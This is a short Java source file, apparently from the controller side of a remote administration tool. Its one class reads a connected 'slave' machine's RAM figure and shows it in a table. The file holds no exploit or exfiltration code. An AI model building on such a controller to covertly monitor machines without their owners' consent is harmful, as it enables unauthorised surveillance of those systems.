package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.Frame;
import com.redpois0n.utils.Util;

public class PacketRAM extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		short ram = slave.readShort();
		slave.setRam(ram);
		
		int row = Util.getRow(slave);
		
		Frame.mainModel.setValueAt(ram + " mb", row, 7);
	}

}
